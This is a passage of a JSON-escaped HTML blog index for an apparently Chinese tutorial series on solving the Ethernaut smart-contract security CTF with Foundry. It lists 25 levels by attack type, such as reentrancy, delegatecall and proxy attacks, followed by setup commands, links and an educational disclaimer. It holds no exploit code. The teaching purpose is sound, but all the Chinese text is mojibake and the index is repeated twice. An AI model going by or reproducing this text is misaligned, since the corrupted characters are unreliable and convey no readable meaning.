ˆ\"><a href=\"#ğŸ—ï¸-æŠ€æœ¯æ ˆ\" class=\"headerlink\" title=\"ğŸ—ï¸ æŠ€æœ¯æ ˆ\"></a>ğŸ—ï¸ æŠ€æœ¯æ ˆ</h2><ul>\n<li><strong>Foundry</strong>: ä»¥å¤ªåŠå¼€å‘æ¡†æ¶</li>\n<li><strong>Solidity</strong>: æ™ºèƒ½åˆçº¦ç¼–ç¨‹è¯­è¨€</li>\n<li><strong>OpenZeppelin</strong>: å®‰å…¨åˆçº¦åº“</li>\n<li><strong>EVM</strong>: ä»¥å¤ªåŠè™šæ‹Ÿæœº</li>\n</ul>\n<h2 id=\"ğŸ“–-å®Œæ•´å…³å¡åˆ—è¡¨\"><a href=\"#ğŸ“–-å®Œæ•´å…³å¡åˆ—è¡¨\" class=\"headerlink\" title=\"ğŸ“– å®Œæ•´å…³å¡åˆ—è¡¨\"></a>ğŸ“– å®Œæ•´å…³å¡åˆ—è¡¨</h2><h3 id=\"åŸºç¡€æ”»å‡»ç¯‡-Level-1-10\"><a href=\"#åŸºç¡€æ”»å‡»ç¯‡-Level-1-10\" class=\"headerlink\" title=\"åŸºç¡€æ”»å‡»ç¯‡ (Level 1-10)\"></a>åŸºç¡€æ”»å‡»ç¯‡ (Level 1-10)</h3><ol>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-01-fallback/\">Level 1: Fallback - å›é€€å‡½æ•°æ¼æ´</a></strong></p>\n<ul>\n<li>Fallback å‡½æ•°æƒé™æå‡</li>\n<li>æœ€åŸºç¡€çš„åˆçº¦æ”»å‡»</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-02-fallout/\">Level 2: Fallout - æ„é€ å‡½æ•°æ‹¼å†™é”™è¯¯</a></strong></p>\n<ul>\n<li>æ„é€ å‡½æ•°å‘½åæ¼æ´</li>\n<li>ä»£ç å®¡è®¡é‡è¦æ€§</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-03-coinflip/\">Level 3: Coin Flip - ä¼ªéšæœºæ•°æ”»å‡»</a></strong></p>\n<ul>\n<li>åŒºå—é“¾ä¼ªéšæœºæ•°æ¼æ´</li>\n<li>å¯é¢„æµ‹æ€§æ”»å‡»</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-04-telephone/\">Level 4: Telephone - tx.origin vs msg.sender</a></strong></p>\n<ul>\n<li>èº«ä»½éªŒè¯ç»•è¿‡</li>\n<li>ä¸­é—´åˆçº¦æ”»å‡»</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-05-token/\">Level 5: Token - æ•´æ•°ä¸‹æº¢æ”»å‡»</a></strong></p>\n<ul>\n<li>ç®—æœ¯æº¢å‡ºæ¼æ´</li>\n<li>SafeMath çš„é‡è¦æ€§</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-06-delegation/\">Level 6: Delegation - delegatecall æ”»å‡»</a></strong></p>\n<ul>\n<li>delegatecall å­˜å‚¨æ§½æ”»å‡»</li>\n<li>ä¸Šä¸‹æ–‡åˆ‡æ¢æ¼æ´</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-07-force/\">Level 7: Force - å¼ºåˆ¶å‘é€ä»¥å¤ªå¸</a></strong></p>\n<ul>\n<li>selfdestruct å¼ºåˆ¶è½¬è´¦</li>\n<li>åˆçº¦ä½™é¢æ“æ§</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-08-vault/\">Level 8: Vault - ç§æœ‰å˜é‡è¯»å–</a></strong></p>\n<ul>\n<li>åŒºå—é“¾æ•°æ®é€æ˜æ€§</li>\n<li>å­˜å‚¨æ§½åˆ†æ</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-09-king/\">Level 9: King - æ‹’ç»æœåŠ¡æ”»å‡»</a></strong></p>\n<ul>\n<li>DoS æ”»å‡»æ¨¡å¼</li>\n<li>æ¶æ„åˆçº¦é˜»æ–­</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-10-reentrancy/\">Level 10: Re-entrancy - é‡å…¥æ”»å‡»</a></strong></p>\n<ul>\n<li>ç»å…¸é‡å…¥æ”»å‡»</li>\n<li>æ£€æŸ¥-æ•ˆæœ-äº¤äº’æ¨¡å¼</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"è¿›é˜¶æ”»å‡»ç¯‡-Level-11-20\"><a href=\"#è¿›é˜¶æ”»å‡»ç¯‡-Level-11-20\" class=\"headerlink\" title=\"è¿›é˜¶æ”»å‡»ç¯‡ (Level 11-20)\"></a>è¿›é˜¶æ”»å‡»ç¯‡ (Level 11-20)</h3><ol start=\"11\">\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-11-elevator/\">Level 11: Elevator - æ¥å£å®ç°æ”»å‡»</a></strong></p>\n<ul>\n<li>æ¥å£æ¶æ„å®ç°</li>\n<li>çŠ¶æ€å˜åŒ–åˆ©ç”¨</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-12-privacy/\">Level 12: Privacy - å­˜å‚¨å¸ƒå±€åˆ†æ</a></strong></p>\n<ul>\n<li>å¤æ‚å­˜å‚¨å¸ƒå±€</li>\n<li>ç§æœ‰æ•°æ®æå–</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-13-gatekeeper-one/\">Level 13: Gatekeeper One - å¤šé‡éªŒè¯ç»•è¿‡</a></strong></p>\n<ul>\n<li>Gas ç²¾ç¡®æ§åˆ¶</li>\n<li>ç±»å‹è½¬æ¢æ”»å‡»</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-14-gatekeeper-two/\">Level 14: Gatekeeper Two - é«˜çº§éªŒè¯ç»•è¿‡</a></strong></p>\n<ul>\n<li>è¿è¡Œæ—¶åˆ›å»ºåˆçº¦</li>\n<li>ä½è¿ç®—æ”»å‡»</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-15-naughtcoin/\">Level 15: Naught Coin - ERC20 æˆæƒæ”»å‡»</a></strong></p>\n<ul>\n<li>ERC20 transferFrom ç»•è¿‡</li>\n<li>æˆæƒæœºåˆ¶æ¼æ´</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-16-preservation/\">Level 16: Preservation - å­˜å‚¨æ§½åŠ«æŒ</a></strong></p>\n<ul>\n<li>å­˜å‚¨æ§½å¸ƒå±€æ”»å‡»</li>\n<li>delegatecall é«˜çº§åˆ©ç”¨</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-17-recovery/\">Level 17: Recovery - åˆçº¦åœ°å€è®¡ç®—</a></strong></p>\n<ul>\n<li>CREATE åœ°å€é¢„æµ‹</li>\n<li>ä¸¢å¤±åˆçº¦æ¢å¤</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-18-magicnumber/\">Level 18: Magic Number - å­—èŠ‚ç åˆ†æ</a></strong></p>\n<ul>\n<li>æ‰‹å†™å­—èŠ‚ç </li>\n<li>EVM åº•å±‚åŸç†</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-19-aliencodex/\">Level 19: Alien Codex - æ•°ç»„è¾¹ç•Œæ”»å‡»</a></strong></p>\n<ul>\n<li>åŠ¨æ€æ•°ç»„ä¸‹æº¢</li>\n<li>å­˜å‚¨æ§½ä»»æ„å†™å…¥</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-20-denial/\">Level 20: Denial - Gas è€—å°½æ”»å‡»</a></strong></p>\n<ul>\n<li>åˆ†çº¢åˆçº¦æ”»å‡»</li>\n<li>Gas æ¶ˆè€— DoS</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"é«˜çº§æ”»å‡»ç¯‡-Level-21-25\"><a href=\"#é«˜çº§æ”»å‡»ç¯‡-Level-21-25\" class=\"headerlink\" title=\"é«˜çº§æ”»å‡»ç¯‡ (Level 21-25)\"></a>é«˜çº§æ”»å‡»ç¯‡ (Level 21-25)</h3><ol start=\"21\">\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-21-shop/\">Level 21: Shop - è§†å›¾å‡½æ•°æ”»å‡»</a></strong></p>\n<ul>\n<li>view å‡½æ•°çŠ¶æ€åˆ©ç”¨</li>\n<li>ä»·æ ¼æ“æ§æ”»å‡»</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-22-dex/\">Level 22: Dex - DEX ä»·æ ¼æ“æ§</a></strong></p>\n<ul>\n<li>AMM ä»·æ ¼è®¡ç®—æ¼æ´</li>\n<li>æµåŠ¨æ€§æ”»å‡»</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-23-dextwo/\">Level 23: Dex Two - ä»£å¸æ³¨å…¥æ”»å‡»</a></strong></p>\n<ul>\n<li>æ¶æ„ä»£å¸æ³¨å…¥</li>\n<li>DEX å®‰å…¨è¿›é˜¶</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-24-puzzlewallet/\">Level 24: Puzzle Wallet - å¤šé‡ç­¾åé’±åŒ…æ”»å‡»</a></strong></p>\n<ul>\n<li>ä»£ç†æ¨¡å¼æ”»å‡»</li>\n<li>å¤æ‚çŠ¶æ€ç®¡ç†</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-25-motorbike/\">Level 25: Motorbike - UUPS ä»£ç†æ”»å‡»</a></strong></p>\n<ul>\n<li>å‡çº§æ¨¡å¼æ¼æ´</li>\n<li>å®ç°åˆçº¦æ”»å‡»</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"ğŸ› ï¸-å¿«é€Ÿå¼€å§‹\"><a href=\"#ğŸ› ï¸-å¿«é€Ÿå¼€å§‹\" class=\"headerlink\" title=\"ğŸ› ï¸ å¿«é€Ÿå¼€å§‹\"></a>ğŸ› ï¸ å¿«é€Ÿå¼€å§‹</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># å…‹éš†é¡¹ç›®</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/XuHugo/Ethernaut-Foundry-Solutions.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> Ethernaut-Foundry-Solutions</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># å®‰è£…ä¾èµ–</span></span><br><span class=\"line\">forge install</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># è¿è¡Œæ‰€æœ‰æµ‹è¯•</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># è¿è¡Œç‰¹å®šå…³å¡æµ‹è¯•</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract FallbackTest -vvv</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ”—-ç›¸å…³èµ„æº\"><a href=\"#ğŸ”—-ç›¸å…³èµ„æº\" class=\"headerlink\" title=\"ğŸ”— ç›¸å…³èµ„æº\"></a>ğŸ”— ç›¸å…³èµ„æº</h2><ul>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub é¡¹ç›®åœ°å€</a></strong></li>\n<li><strong><a href=\"https://ethernaut.openzeppelin.com/\">Ethernaut å®˜ç½‘</a></strong></li>\n<li><strong><a href=\"https://book.getfoundry.sh/\">Foundry å®˜æ–¹æ–‡æ¡£</a></strong></li>\n<li><strong><a href=\"https://docs.openzeppelin.com/\">OpenZeppelin æ–‡æ¡£</a></strong></li>\n</ul>\n<h2 id=\"ğŸš¨-å…è´£å£°æ˜\"><a href=\"#ğŸš¨-å…è´£å£°æ˜\" class=\"headerlink\" title=\"ğŸš¨ å…è´£å£°æ˜\"></a>ğŸš¨ å…è´£å£°æ˜</h2><p>æœ¬ç³»åˆ—æ–‡ç« çº¯å±æ•™è‚²ç›®çš„ï¼Œæ‰€æœ‰å†…å®¹ä»…ç”¨äºï¼š</p>\n<ul>\n<li>å­¦ä¹ æ™ºèƒ½åˆçº¦å®‰å…¨çŸ¥è¯†</li>\n<li>ç†è§£å¸¸è§æ¼æ´æ¨¡å¼</li>\n<li>æé«˜ä»£ç å®¡è®¡èƒ½åŠ›</li>\n</ul>\n<p>è¯·å‹¿å°†ç›¸å…³æŠ€æœ¯ç”¨äºæ”»å‡»çœŸå®çš„æ™ºèƒ½åˆçº¦æˆ–è¿›è¡Œä»»ä½•éæ³•æ´»åŠ¨ã€‚</p>\n<h2 id=\"ğŸ¤-è´¡çŒ®ä¸åé¦ˆ\"><a href=\"#ğŸ¤-è´¡çŒ®ä¸åé¦ˆ\" class=\"headerlink\" title=\"ğŸ¤ è´¡çŒ®ä¸åé¦ˆ\"></a>ğŸ¤ è´¡çŒ®ä¸åé¦ˆ</h2><p>å¦‚æœä½ å‘ç°ä»»ä½•é—®é¢˜æˆ–æœ‰æ”¹è¿›å»ºè®®ï¼Œæ¬¢è¿ï¼š</p>\n<ul>\n<li>åœ¨ GitHub æäº¤ Issue</li>\n<li>å‘èµ· Pull Request</li>\n<li>åœ¨è¯„è®ºåŒºè®¨è®º</li>\n</ul>\n<hr>\n<p><em>è®©æˆ‘ä»¬ä¸€èµ·æ„å»ºæ›´å®‰å…¨çš„ Web3 ä¸–ç•Œï¼</em> ğŸŒŸ</p>\n","more":"<h1 id=\"ğŸ›¡ï¸-Ethernaut-Foundry-Solutions-å®Œæ•´ç³»åˆ—æ•™ç¨‹\"><a href=\"#ğŸ›¡ï¸-Ethernaut-Foundry-Solutions-å®Œæ•´ç³»åˆ—æ•™ç¨‹\" class=\"headerlink\" title=\"ğŸ›¡ï¸ Ethernaut Foundry Solutions - å®Œæ•´ç³»åˆ—æ•™ç¨‹\"></a>ğŸ›¡ï¸ Ethernaut Foundry Solutions - å®Œæ•´ç³»åˆ—æ•™ç¨‹</h1><blockquote>\n<p><strong>Ethernaut</strong> æ˜¯ç”± OpenZeppelin å¼€å‘çš„ Web3&#x2F;Solidity æ™ºèƒ½åˆçº¦å®‰å…¨ CTFï¼ˆCapture The Flagï¼‰æ¸¸æˆï¼Œçµæ„Ÿæ¥æºäº overthewire.orgã€‚æ¯ä¸ªå…³å¡éƒ½æ˜¯ä¸€ä¸ªæ™ºèƒ½åˆçº¦ï¼Œç©å®¶éœ€è¦æ‰¾åˆ°æ¼æ´å¹¶åˆ©ç”¨å®ƒä»¬æ¥å®ŒæˆæŒ‘æˆ˜ã€‚</p>\n</blockquote>\n<h2 id=\"ğŸ“š-ç³»åˆ—ä»‹ç»\"><a href=\"#ğŸ“š-ç³»åˆ—ä»‹ç»\" class=\"headerlink\" title=\"ğŸ“š ç³»åˆ—ä»‹ç»\"></a>ğŸ“š ç³»åˆ—ä»‹ç»</h2><p>æœ¬ç³»åˆ—æ–‡ç« è¯¦ç»†ä»‹ç»å¦‚ä½•ä½¿ç”¨ <strong>Foundry</strong> æ¡†æ¶æ¥è§£å†³ Ethernaut çš„å„ä¸ªæŒ‘æˆ˜ã€‚Foundry æ˜¯ä¸€ä¸ªç°ä»£åŒ–çš„ä»¥å¤ªåŠå¼€å‘å·¥å…·å¥—ä»¶ï¼Œæä¾›äº†å¼ºå¤§çš„æµ‹è¯•ã€éƒ¨ç½²å’Œè°ƒè¯•åŠŸèƒ½ã€‚</p>\n<h3 id=\"ğŸ¯-å­¦ä¹ ç›®æ ‡\"><a href=\"#ğŸ¯-å­¦ä¹ ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ¯ å­¦ä¹ ç›®æ ‡\"></a>ğŸ¯ å­¦ä¹ ç›®æ ‡</h3><p>é€šè¿‡æœ¬ç³»åˆ—ï¼Œä½ å°†å­¦ä¼šï¼š</p>\n<ul>\n<li>âœ… <strong>Foundry æ¡†æ¶çš„ä½¿ç”¨</strong>ï¼šä»å®‰è£…åˆ°é«˜çº§åŠŸèƒ½</li>\n<li>âœ… <strong>æ™ºèƒ½åˆçº¦å®‰å…¨å®¡è®¡</strong>ï¼šè¯†åˆ«å¸¸è§æ¼æ´æ¨¡å¼</li>\n<li>âœ… <strong>æ”»å‡»æŠ€æœ¯å®ç°</strong>ï¼šé‡å…¥æ”»å‡»ã€æ•´æ•°æº¢å‡ºã€æƒé™æå‡ç­‰</li>\n<li>âœ… <strong>é˜²å¾¡æœºåˆ¶è®¾è®¡</strong>ï¼šå¦‚ä½•ç¼–å†™æ›´å®‰å…¨çš„æ™ºèƒ½åˆçº¦</li>\n<li>âœ… <strong>CTF è§£é¢˜æ€è·¯</strong>ï¼šç³»ç»ŸåŒ–çš„å®‰å…¨åˆ†ææ–¹æ³•</li>\n</ul>\n<h2 id=\"ğŸ—ï¸-æŠ€æœ¯æ ˆ\"><a href=\"#ğŸ—ï¸-æŠ€æœ¯æ ˆ\" class=\"headerlink\" title=\"ğŸ—ï¸ æŠ€æœ¯æ ˆ\"></a>ğŸ—ï¸ æŠ€æœ¯æ ˆ</h2><ul>\n<li><strong>Foundry</strong>: ä»¥å¤ªåŠå¼€å‘æ¡†æ¶</li>\n<li><strong>Solidity</strong>: æ™ºèƒ½åˆçº¦ç¼–ç¨‹è¯­è¨€</li>\n<li><strong>OpenZeppelin</strong>: å®‰å…¨åˆçº¦åº“</li>\n<li><strong>EVM</strong>: ä»¥å¤ªåŠè™šæ‹Ÿæœº</li>\n</ul>\n<h2 id=\"ğŸ“–-å®Œæ•´å…³å¡åˆ—è¡¨\"><a href=\"#ğŸ“–-å®Œæ•´å…³å¡åˆ—è¡¨\" class=\"headerlink\" title=\"ğŸ“– å®Œæ•´å…³å¡åˆ—è¡¨\"></a>ğŸ“– å®Œæ•´å…³å¡åˆ—è¡¨</h2><h3 id=\"åŸºç¡€æ”»å‡»ç¯‡-Level-1-10\"><a href=\"#åŸºç¡€æ”»å‡»ç¯‡-Level-1-10\" class=\"headerlink\" title=\"åŸºç¡€æ”»å‡»ç¯‡ (Level 1-10)\"></a>åŸºç¡€æ”»å‡»ç¯‡ (Level 1-10)</h3><ol>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-01-fallback/\">Level 1: Fallback - å›é€€å‡½æ•°æ¼æ´</a></strong></p>\n<ul>\n<li>Fallback å‡½æ•°æƒé™æå‡</li>\n<li>æœ€åŸºç¡€çš„åˆçº¦æ”»å‡»</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-02-fallout/\">Level 2: Fallout - æ„é€ å‡½æ•°æ‹¼å†™é”™è¯¯</a></strong></p>\n<ul>\n<li>æ„é€ å‡½æ•°å‘½åæ¼æ´</li>\n<li>ä»£ç å®¡è®¡é‡è¦æ€§</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-03-coinflip/\">Level 3: Coin Flip - ä¼ªéšæœºæ•°æ”»å‡»</a></strong></p>\n<ul>\n<li>åŒºå—é“¾ä¼ªéšæœºæ•°æ¼æ´</li>\n<li>å¯é¢„æµ‹æ€§æ”»å‡»</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-04-telephone/\">Level 4: Telephone - tx.origin vs msg.sender</a></strong></p>\n<ul>\n<li>èº«ä»½éªŒè¯ç»•è¿‡</li>\n<li>ä¸­é—´åˆçº¦æ”»å‡»</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-05-token/\">Level 5: Token - æ•´æ•°ä¸‹æº¢æ”»å‡»</a></strong></p>\n<ul>\n<li>ç®—æœ¯æº¢å‡ºæ¼æ´</li>\n<li>SafeMath çš„é‡è¦æ€§</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-06-delegation/\">Level 6: Delegation - delegatecall æ”»å‡»</a></strong></p>\n<ul>\n<li>delegatecall å­˜å‚¨æ§½æ”»å‡»</li>\n<li>ä¸Šä¸‹æ–‡åˆ‡æ¢æ¼æ´</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-07-force/\">Level 7: Force - å¼ºåˆ¶å‘é€ä»¥å¤ªå¸</a></strong></p>\n<ul>\n<li>selfdestruct å¼ºåˆ¶è½¬è´¦</li>\n<li>åˆçº¦ä½™é¢æ“æ§</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-08-vault/\">Level 8: Vault - ç§æœ‰å˜é‡è¯»å–</a></strong></p>\n<ul>\n<li>åŒºå—é“¾æ•°æ®é€æ˜æ€§</li>\n<li>å­˜å‚¨æ§½åˆ†æ</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-09-king/\">Level 9: King - æ‹’ç»æœåŠ¡æ”»å‡»</a></strong></p>\n<ul>\n<li>DoS æ”»å‡»æ¨¡å¼</li>\n<li>æ¶æ„åˆçº¦é˜»æ–­</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-10-reentrancy/\">Level 10: Re-entrancy - é‡å…¥æ”»å‡»</a></strong></p>\n<ul>\n<li>ç»å…¸é‡å…¥æ”»å‡»</li>\n<li>æ£€æŸ¥-æ•ˆæœ-äº¤äº’æ¨¡å¼</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"è¿›é˜¶æ”»å‡»ç¯‡-Level-11-20\"><a href=\"#è¿›é˜¶æ”»å‡»ç¯‡-Level-11-20\" class=\"headerlink\" title=\"è¿›é˜¶æ”»å‡»ç¯‡ (Level 11-20)\"></a>è¿›é˜¶æ”»å‡»ç¯‡ (Level 11-20)</h3><ol start=\"11\">\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-11-elevator/\">Level 11: Elevator - æ¥å£å®ç°æ”»å‡»</a></strong></p>\n<ul>\n<li>æ¥å£æ¶æ„å®ç°</li>\n<li>çŠ¶æ€å˜åŒ–åˆ©ç”¨</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-12-privacy/\">Level 12: Privacy - å­˜å‚¨å¸ƒå±€åˆ†æ</a></strong></p>\n<ul>\n<li>å¤æ‚å­˜å‚¨å¸ƒå±€</li>\n<li>ç§æœ‰æ•°æ®æå–</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-13-gatekeeper-one/\">Level 13: Gatekeeper One - å¤šé‡éªŒè¯ç»•è¿‡</a></strong></p>\n<ul>\n<li>Gas ç²¾ç¡®æ§åˆ¶</li>\n<li>ç±»å‹è½¬æ¢æ”»å‡»</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-14-gatekeeper-two/\">Level 14: Gatekeeper Two - é«˜çº§éªŒè¯ç»•è¿‡</a></strong></p>\n<ul>\n<li>è¿è¡Œæ—¶åˆ›å»ºåˆçº¦</li>\n<li>ä½è¿ç®—æ”»å‡»</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-15-naughtcoin/\">Level 15: Naught Coin - ERC20 æˆæƒæ”»å‡»</a></strong></p>\n<ul>\n<li>ERC20 transferFrom ç»•è¿‡</li>\n<li>æˆæƒæœºåˆ¶æ¼æ´</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-16-preservation/\">Level 16: Preservation - å­˜å‚¨æ§½åŠ«æŒ</a></strong></p>\n<ul>\n<li>å­˜å‚¨æ§½å¸ƒå±€æ”»å‡»</li>\n<li>delegatecall é«˜çº§åˆ©ç”¨</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-17-recovery/\">Level 17: Recovery - åˆçº¦åœ°å€è®¡ç®—</a></strong></p>\n<ul>\n<li>CREATE åœ°å€é¢„æµ‹</li>\n<li>ä¸¢å¤±åˆçº¦æ¢å¤</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-18-magicnumber/\">Level 18: Magic Number - å­—èŠ‚ç åˆ†æ</a></strong></p>\n<ul>\n<li>æ‰‹å†™å­—èŠ‚ç </li>\n<li>EVM åº•å±‚åŸç†</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-19-aliencodex/\">Level 19: Alien Codex - æ•°ç»„è¾¹ç•Œæ”»å‡»</a></strong></p>\n<ul>\n<li>åŠ¨æ€æ•°ç»„ä¸‹æº¢</li>\n<li>å­˜å‚¨æ§½ä»»æ„å†™å…¥</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-20-denial/\">Level 20: Denial - Gas è€—å°½æ”»å‡»</a></strong></p>\n<ul>\n<li>åˆ†çº¢åˆçº¦æ”»å‡»</li>\n<li>Gas æ¶ˆè€— DoS</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"é«˜çº§æ”»å‡»ç¯‡-Level-21-25\"><a href=\"#é«˜çº§æ”»å‡»ç¯‡-Level-21-25\" class=\"headerlink\" title=\"é«˜çº§æ”»å‡»ç¯‡ (Level 21-25)\"></a>é«˜çº§æ”»å‡»ç¯‡ (Level 21-25)</h3><ol start=\"21\">\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-21-shop/\">Level 21: Shop - è§†å›¾å‡½æ•°æ”»å‡»</a></strong></p>\n<ul>\n<li>view å‡½æ•°çŠ¶æ€åˆ©ç”¨</li>\n<li>ä»·æ ¼æ“æ§æ”»å‡»</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-22-dex/\">Level 22: Dex - DEX ä»·æ ¼æ“æ§</a></strong></p>\n<ul>\n<li>AMM ä»·æ ¼è®¡ç®—æ¼æ´</li>\n<li>æµåŠ¨æ€§æ”»å‡»</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-23-dextwo/\">Level 23: Dex Two - ä»£å¸æ³¨å…¥æ”»å‡»</a></strong></p>\n<ul>\n<li>æ¶æ„ä»£å¸æ³¨å…¥</li>\n<li>DEX å®‰å…¨è¿›é˜¶</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-24-puzzlewallet/\">Level 24: Puzzle Wallet - å¤šé‡ç­¾åé’±åŒ…æ”»å‡»</a></strong></p>\n<ul>\n<li>ä»£ç†æ¨¡å¼æ”»å‡»</li>\n<li>å¤æ‚çŠ¶æ€ç®¡ç†</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-25-motorbike/\">Level 25: Motorbike - UUPS ä»£ç†æ”»å‡»</a></strong></p>\n<ul>\n<li>å‡çº§æ¨¡å¼æ¼æ´</li>\n<li>å®ç°åˆçº¦æ”»å‡»</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"ğŸ› ï¸-å¿«é€Ÿå¼€å§‹\"><a href=\"#ğŸ› ï¸-å¿«é€Ÿå¼€å§‹\" class=\"headerlink\" title=\"ğŸ› ï¸ å¿«é€Ÿå¼€å§‹\"></a>ğŸ› ï¸ å¿«é€Ÿå¼€å§‹</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># å…‹éš†é¡¹ç›®</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/XuHugo/Ethernaut-Foundry-Solutions.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> Ethernaut-Foundry-Solutions</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># å®‰è£…ä¾èµ–</span></span><br><span class=\"line\">forge install</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># è¿è¡Œæ‰€æœ‰æµ‹è¯•</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># è¿è¡Œç‰¹å®šå…³å¡æµ‹è¯•</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract FallbackTest -vvv</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ”—-ç›¸å…³èµ„æº\"><a href=\"#ğŸ”—-ç›¸å…³èµ„æº\" class=\"headerlink\" title=\"ğŸ”— ç›¸å…³èµ„æº\"></a>ğŸ”— ç›¸å…³èµ„æº</h2><ul>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub é¡¹ç›®åœ°å€</a></strong></li>\n<li><strong><a href=\"https://ethernaut.openzeppelin.com/\">Ethernaut å®˜ç½‘</a></strong></li>\n<li><strong><a href=\"https://book.getfoundry.sh/\">Foundry å®˜æ–¹æ–‡æ¡£</a></strong></li>\n<li><strong><a href=\"https://docs.openzeppelin.com/\">OpenZeppelin 